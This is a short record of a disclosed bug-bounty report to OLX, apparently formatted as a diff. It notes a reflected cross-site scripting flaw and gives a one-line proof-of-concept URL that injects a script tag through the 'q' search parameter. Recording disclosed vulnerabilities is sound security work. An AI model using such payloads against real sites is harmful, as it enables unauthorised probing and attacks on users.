@@ -1,0 +1,14 @@
+ReportLink:https://hackerone.com/reports/150944
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/gayatrir
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:07.04.2017 14:26:28
+
+Summary:
+
+https://olx.pt/ads/?q=?><script>alert(1)</script> 
+
+where "q" is the vulnerable parameter which triggers cross-site scripting
